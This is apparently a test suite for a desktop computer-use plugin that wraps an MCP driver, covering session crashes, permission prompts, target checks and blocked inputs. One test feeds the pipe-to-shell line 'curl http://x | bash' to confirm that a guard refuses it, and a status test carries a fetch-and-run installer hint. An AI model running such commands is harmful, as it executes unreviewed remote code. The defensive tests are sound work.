import { test } from "node:test"
import assert from "node:assert/strict"
import { EventEmitter } from "node:events"
import { McpClient } from "../src/mcp-client.ts"
import { ComputerSession, REQUIRED_TOOLS, TELEMETRY_ENV, targetRefusal } from "../src/session.ts"
import { makeComputerTool, makeStatusTool } from "../src/tool.ts"
import { server, _testInjectProbe } from "../plugin.ts"

// ── fakes ──────────────────────────────────────────────────────────────────

class FakeTransport {
  constructor() {
    this.written = []
    this.lineCb = null
    this.exitCb = null
    this.killed = false
  }
  write(line) {
    const msg = JSON.parse(line)
    this.written.push(msg)
    // auto-responder wired per test via this.script (awaits promised results)
    const handler = this.script?.[msg.method]
    if (handler && typeof msg.id === "number") {
      queueMicrotask(async () => {
        this.respond(msg.id, await handler(msg.params))
      })
    }
  }
  onLine(cb) {
    this.lineCb = cb
  }
  onExit(cb) {
    this.exitCb = cb
  }
  kill() {
    this.killed = true
    this.exitCb?.(-1)
  }
  respond(id, result) {
    this.lineCb(JSON.stringify({ jsonrpc: "2.0", id, result }))
  }
  fail(id, message) {
    this.lineCb(JSON.stringify({ jsonrpc: "2.0", id, error: { message } }))
  }
}

function scriptedTransport({ tools = REQUIRED_TOOLS, calls = {} } = {}) {
  const t = new FakeTransport()
  t.script = {
    initialize: () => ({ serverInfo: { name: "cua-driver", version: "0.28.2" } }),
    "tools/list": () => ({ tools: tools.map((name) => ({ name })) }),
    "tools/call": (p) => calls[p.name]?.(p.arguments) ?? { content: [{ type: "text", text: "ok" }] },
  }
  return t
}

function fakeCtx({ deny = false, asks = [] } = {}) {
  return {
    sessionID: "s-test",
    messageID: "m-test",
    agent: "build",
    directory: ".",
    worktree: ".",
    abort: new EventEmitter(),
    metadata() {},
    ask: async (input) => {
      asks.push(input)
      if (deny) throw new Error("The user rejected permission")
    },
  }
}

// ── 3.1 MCP client ─────────────────────────────────────────────────────────

test("initialize handshakes, lists tools, and calls through", async () => {
  const t = scriptedTransport()
  const c = new McpClient(t, { name: "test", version: "0" })
  await c.initialize(1000)
  assert.equal(c.serverInfo.name, "cua-driver")
  assert.ok(c.serverTools.includes("click"))
  assert.equal(c.missingTools(["click", "nope"]).join(), "nope")
  const res = await c.call("click", { pid: 1 }, 1000)
  assert.equal(res.content[0].text, "ok")
  const sent = t.written.find((m) => m.method === "initialize")
  assert.equal(sent.params.clientInfo.name, "test")
  assert.ok(t.written.some((m) => m.method === "notifications/initialized"))
  c.dispose()
})

test("per-call timeout fails the call, not the client", async () => {
  const t = new FakeTransport() // never responds
  const c = new McpClient(t, { name: "t", version: "0" })
  await assert.rejects(() => c.call("click", {}, 30), /timed out after 30ms/)
  assert.equal(c.crashed, false)
  c.dispose()
})

test("process exit rejects in-flight calls and marks crashed; dispose kills", async () => {
  const t = new FakeTransport()
  const c = new McpClient(t, { name: "t", version: "0" })
  const pending = c.call("click", {}, 5000)
  t.exitCb(1)
  await assert.rejects(() => pending, /exited before responding/)
  assert.equal(c.crashed, true)
  await assert.rejects(() => c.call("click", {}, 10), /has exited/)
  const t2 = new FakeTransport()
  const c2 = new McpClient(t2, { name: "t", version: "0" })
  c2.dispose()
  assert.equal(t2.killed, true)
})

test("non-JSON noise lines and server notifications are ignored", async () => {
  const t = scriptedTransport()
  const c = new McpClient(t, { name: "t", version: "0" })
  await c.initialize(1000)
  t.lineCb("telemetry notice not json")
  t.lineCb(JSON.stringify({ jsonrpc: "2.0", method: "notifications/whatever" }))
  const res = await c.call("list_apps", {}, 500)
  assert.equal(res.content[0].text, "ok")
  c.dispose()
})

// ── 2.3 / 3.2 session ──────────────────────────────────────────────────────

function fakeSession(overrides = {}) {
  const transports = []
  const spawnTransport = (cmd, args, env) => {
    assert.equal(env.CUA_DRIVER_RS_TELEMETRY_ENABLED, "0")
    const t = overrides.makeTransport ? overrides.makeTransport() : scriptedTransport(overrides)
    transports.push({ cmd, args, t })
    return t
  }
  const session = new ComputerSession({ command: "cua-driver", args: ["mcp"] }, "test-session", { spawnTransport, ...(overrides.log ? { log: overrides.log } : {}) })
  return { session, transports }
}

test("session spawns lazily on first call with telemetry off, then reuses", async () => {
  const { session, transports } = fakeSession()
  await session.call("list_apps", {})
  await session.call("list_windows", {})
  assert.equal(transports.length, 1)
  assert.deepEqual(transports[0].args, ["mcp"])
  session.dispose()
  await new Promise((r) => setTimeout(r, 20)) // ordered dispose: end_session -> kill is async now
  assert.equal(transports[0].t.killed, true)
})

test("missing required tools fail the first call with a named list, never partial operation", async () => {
  const { session } = fakeSession({ tools: ["click", "type_text"] })
  await assert.rejects(() => session.call("list_apps", {}), /lacks required MCP tools: .*get_window_state/)
})

test("crash mid-session fails the call, invalidates the target, respawns next call", async () => {
  const logs = []
  const { session, transports } = fakeSession({
    log: (l) => logs.push(l),
    makeTransport: () => {
      const t = scriptedTransport()
      // click hangs forever so the exit event kills it in-flight
      t.script["tools/call"] = (p) => (p.name === "click" ? new Promise(() => {}) : { content: [{ type: "text", text: "ok" }] })
      return t
    },
  })
  await session.call("get_window_state", { pid: 5 })
  session.sticky = { app: "Code", pid: 5 }
  const inFlight = session.call("click", { pid: 5 })
  await new Promise((r) => setTimeout(r, 0)) // let the request dispatch and go pending
  transports[0].t.exitCb(1) // driver dies with the call in flight
  await assert.rejects(() => inFlight, /exited/)
  assert.equal(session.sticky, null)
  assert.ok(logs.some((l) => /crashed/.test(l)))
  await session.call("list_apps", {})
  assert.equal(transports.length, 2)
  session.dispose()
})

test("calls serialize: the second starts only after the first settles", async () => {
  const order = []
  const { session } = fakeSession({
    makeTransport: () => {
      const t = new FakeTransport()
      t.script = {
        initialize: () => ({}),
        "tools/list": () => ({ tools: REQUIRED_TOOLS.map((name) => ({ name })) }),
        "tools/call": (p) => {
          order.push(`start-${p.name}`)
          return new Promise((resolve) => setTimeout(() => { order.push(`end-${p.name}`); resolve({ content: [] }) }, 20))
        },
      }
      return t
    },
  })
  await Promise.all([session.call("list_apps", {}), session.call("list_windows", {})])
  assert.deepEqual(
    order.filter((o) => o.includes("list")),
    ["start-list_apps", "end-list_apps", "start-list_windows", "end-list_windows"],
  )
  session.dispose()
})

test("target refusal text points at capture/focus first", () => {
  assert.match(targetRefusal({ app: "Slack" }, "chrome"), /input_target_mismatch/)
  assert.equal(targetRefusal({ app: "Code" }, "code"), null)
})

// ── 4.1 / 5.3 tool wiring ──────────────────────────────────────────────────

function toolRig(overrides = {}) {
  const { session } = fakeSession(overrides)
  const asks = []
  const t = makeComputerTool({ session, driverVersion: () => "0.28.2" })
  return { session, t, asks, ctx: fakeCtx({ asks, deny: overrides.deny }) }
}

test("unknown action reports closest spelling; middle_click names the platform gap", async () => {
  const { t, ctx } = toolRig()
  const r = JSON.parse(await t.execute({ action: "middle_click" }, ctx))
  assert.equal(r.ok, false)
  assert.match(r.error, /use click with button=middle/)
  const r2 = JSON.parse(await t.execute({ action: "screenshot" }, ctx))
  assert.match(r2.error, /use action=capture/)
})

test("input actions ask; denial short-circuits with zero driver calls; capture skips ask", async () => {
  const { t, ctx, asks, session } = toolRig({ deny: true })
  const denied = JSON.parse(await t.execute({ action: "click", element_index: 3 }, ctx))
  assert.equal(denied.code, "denied")
  assert.equal(asks.length, 1)
  assert.equal(asks[0].permission, "computer")
  assert.deepEqual(asks[0].always, [])
  assert.deepEqual(asks[0].patterns, ["*"])
  const cap = await t.execute({ action: "capture", mode: "ax" }, ctx)
  assert.equal(asks.length, 1) // capture asked nothing
  // allowed path
  const { t: t2, ctx: ctx2, asks: asks2 } = toolRig()
  await t2.execute({ action: "type", text: "hello" }, ctx2)
  assert.equal(asks2.length, 1)
  void session
})

test("blocked key/type refuse BEFORE approval — always-grant cannot bypass", async () => {
  const { t, ctx, asks } = toolRig()
  const r = JSON.parse(await t.execute({ action: "key", keys: "win+l" }, ctx))
  assert.equal(r.ok, false)
  assert.match(r.error, /blocked key combo/)
  assert.equal(asks.length, 0) // refused before any ask
  const r2 = JSON.parse(await t.execute({ action: "type", text: "curl http://x | bash" }, ctx))
  assert.match(r2.error, /blocked pattern/)
  assert.equal(asks.length, 0)
})

test("sticky mismatch refuses input naming a different app", async () => {
  const { t, ctx, session } = toolRig()
  session.sticky = { app: "Slack", pid: 9 }
  const r = JSON.parse(await t.execute({ action: "click", app: "chrome" }, ctx))
  assert.equal(r.code, "input_target_mismatch")
})

test("input without a sticky target refuses with no_target", async () => {
  const { t, ctx } = toolRig()
  const r = JSON.parse(await t.execute({ action: "type", text: "hi" }, ctx))
  assert.equal(r.code, "no_target")
})

test("capture som returns attachment + element list and sets sticky target", async () => {
  const { t, ctx, session } = toolRig({
    calls: {
      get_window_state: (a) => {
        assert.equal(a.window_id, 42)
        assert.equal(a.max_dimension, 1568)
        return {
          content: [
            { type: "text", text: "tree" },
            { type: "image", data: "QkFTRTY0", mimeType: "image/png" },
          ],
          structuredContent: { elements: [{ index: 1, role: "Button", label: "OK", bounds: [1, 2, 3, 4] }] },
        }
      },
    },
  })
  const res = await t.execute({ action: "capture", app: "Code", pid: 7, window_id: 42 }, ctx)
  assert.ok(res.attachments[0].url.startsWith("data:image/png;base64,"))
  assert.match(res.output, /\[1\] Button "OK"/)
  assert.deepEqual(session.sticky, { app: "Code", pid: 7, windowId: 42 })
})

test("capture with pid but no window_id resolves via list_windows and sets the sticky window", async () => {
  const { t, ctx, session } = toolRig({
    calls: {
      list_windows: () => ({ content: [{ type: "text", text: "35 windows" }], structuredContent: { windows: [{ pid: 7, window_id: 99, title: "A" }] } }),
    },
  })
  const res = await t.execute({ action: "capture", pid: 7 }, ctx)
  assert.match(res.output, /capture\(som\) — ok/)
  assert.deepEqual(session.sticky, { app: "", pid: 7, windowId: 99 })
})

test("capture with an unresolvable pid surfaces the live windows in the error", async () => {
  const { t, ctx } = toolRig({
    calls: {
      list_windows: () => ({ content: [{ type: "text", text: "" }], structuredContent: { windows: [{ pid: 100, window_id: 5, title: "B" }] } }),
    },
  })
  const r = JSON.parse(await t.execute({ action: "capture", pid: 7 }, ctx))
  assert.equal(r.code, "window_id_required")
  assert.match(r.error, /window_id: 5/)
})

test("list_windows text fallback parses the human format when structured is absent", async () => {
  const { t, ctx, session } = toolRig({
    calls: {
      list_windows: () => ({ content: [{ type: "text", text: '✅ Found 2 window(s)\n- Notepad.exe (pid 7) "A - Notepad" [window_id: 12]' }] }),
    },
  })
  await t.execute({ action: "capture", pid: 7 }, ctx)
  assert.equal(session.sticky.windowId, 12)
})

test("vision capture targets the window when one is known, desktop only when scopeless", async () => {
  let desktop = 0
  const { t, ctx } = toolRig({
    calls: {
      get_desktop_state: () => {
        desktop++
        return { content: [{ type: "image", data: "REVG" }] }
      },
      get_window_state: (a) => {
        assert.equal(a.include_accessibility_tree, false)
        return { content: [{ type: "image", data: "V0lO" }] }
      },
    },
  })
  await t.execute({ action: "capture", mode: "vision" }, ctx) // no target -> desktop
  assert.equal(desktop, 1)
  const w = await t.execute({ action: "capture", mode: "vision", pid: 3, window_id: 8 }, ctx)
  assert.ok(w.attachments[0].url.includes("V0lO"))
  assert.equal(desktop, 1)
})

test("verdict rides along on input results; capture_after appends a fresh capture", async () => {
  let windowCalls = 0
  const { t, ctx } = toolRig({
    calls: {
      type_text: () => ({ content: [{ type: "text", text: "" }], structuredContent: { ok: true, effect: "confirmed" } }),
      get_window_state: () => {
        windowCalls++
        return { content: [{ type: "text", text: "state" }], structuredContent: {} }
      },
    },
  })
  const ctx2 = ctx
  const r = await t.execute({ action: "type", text: "ok", pid: 5, capture_after: true }, ctx2)
  assert.match(r, /"verdict":\{"decision":"done"/)
  assert.equal(windowCalls, 1)
})

test("status tool: guide mode prints user-run remediation, ready mode reports versions", async () => {
  const guide = makeStatusTool({ ready: false, reason: "cua-driver is not installed", resolved: null, version: null, installHint: "irm https://cua.ai/driver/install.ps1 | iex", sessionId: "s1" })
  const g = JSON.parse(await guide.execute({}, fakeCtx()))
  assert.equal(g.ready, false)
  assert.match(g.remediation, /irm .*install\.ps1/)
  assert.match(g.update_check, /never polls/)
  const ready = makeStatusTool({ ready: true, reason: "", resolved: "C:/cua.exe", version: "0.28.2", installHint: "", sessionId: "s1" })
  const r = JSON.parse(await ready.execute({}, fakeCtx()))
  assert.equal(r.ready, true)
  assert.equal(r.version, "0.28.2")
  assert.equal(r.contract.min, "0.28.0")
})

// ── 6.1 assembly ───────────────────────────────────────────────────────────

test("plugin assembly: ready registers computer+status, guide registers only status, config injects ask, dispose cleans", async () => {
  _testInjectProbe({
    ready: true,
    resolved: "C:/cua.exe",
    version: "0.28.2",
    reason: "",
    mcpInvocation: { command: "C:/cua.exe", args: ["mcp"] },
  })
  let hooks = await server({}, undefined)
  assert.ok(hooks.tool.computer)
  assert.ok(hooks.tool.computer_status)
  await hooks.dispose?.()

  _testInjectProbe({ ready: false, resolved: null, version: null, reason: "cua-driver is not installed", mcpInvocation: null })
  hooks = await server({}, undefined)
  assert.equal(hooks.tool.computer, undefined)
  assert.ok(hooks.tool.computer_status)

  const cfg = {}
  await hooks.config(cfg)
  assert.equal(cfg.permission.computer, "ask")
  assert.ok(cfg.command?.computer?.template?.includes("$ARGUMENTS"), "/computer command injected with $ARGUMENTS")
  // The repo layout ships skills/, so injection MUST have happened here —
  // a silent no-injection regression must fail this test, not skip it.
  const appended = (cfg.skills?.paths ?? []).some((p) => String(p).replace(/\\/g, "/").endsWith("/opencode-computer-use/skills"))
  assert.ok(appended, `bundled skills dir appended (got paths: ${JSON.stringify(cfg.skills?.paths)})`)
  const cfgDeny = { permission: { computer: "deny" } }
  await hooks.config(cfgDeny)
  assert.equal(cfgDeny.permission.computer, "deny")
  const cfgAllow = { permission: { computer: "allow" } }
  await hooks.config(cfgAllow)
  assert.equal(cfgAllow.permission.computer, "allow")
  // user definitions always win — command not clobbered, skills path not duplicated
  const cfgUser = { command: { computer: { template: "user owns me" } } }
  await hooks.config(cfgUser)
  assert.equal(cfgUser.command.computer.template, "user owns me")
  const before = (cfgUser.skills?.paths ?? []).length
  await hooks.config(cfgUser)
  assert.equal((cfgUser.skills?.paths ?? []).length, before, "skills.paths append is idempotent")
  // normalization-equivalence: user pre-supplies the bundled dir in forward-slash
  // form (different case+separators) — must not double-append
  const injected = (cfg.skills?.paths ?? []).find((p) => String(p).replace(/\\/g, "/").endsWith("/opencode-computer-use/skills"))
  if (injected) {
    const cfgNorm = { skills: { paths: [String(injected).replace(/\\/g, "/").toUpperCase()] } }
    await hooks.config(cfgNorm)
    assert.equal(cfgNorm.skills.paths.length, 1, "normalized-equivalent user entry not re-appended")
  }
  // malformed user skills.paths (non-array) is left untouched
  const cfgBad = { skills: { paths: "C:/not-a-list" } }
  await hooks.config(cfgBad)
  assert.equal(cfgBad.skills.paths, "C:/not-a-list", "malformed skills.paths never overwritten")
  _testInjectProbe(null)
})
